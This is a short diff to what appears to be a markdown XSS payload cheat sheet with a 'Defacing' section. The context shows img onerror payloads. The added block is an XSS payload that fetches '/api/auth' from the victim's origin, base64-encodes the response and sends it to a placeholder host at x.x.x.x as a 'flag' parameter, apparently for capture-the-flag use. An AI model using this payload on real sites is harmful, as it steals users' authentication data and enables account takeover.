@@ -11,6 +11,10 @@
 <img src="" onerror=alert(window.origin)>
 <img src="https://x.x.x.x">
 ```
+
+```bash
+<img src='1' onerror='fetch("/api/auth").then(r=>r.text()).then(d=>new Image().src="http://x.x.x.x/?flag="+encodeURIComponent(btoa(d));'>
+```
 ### Defacing
 
 ```bash
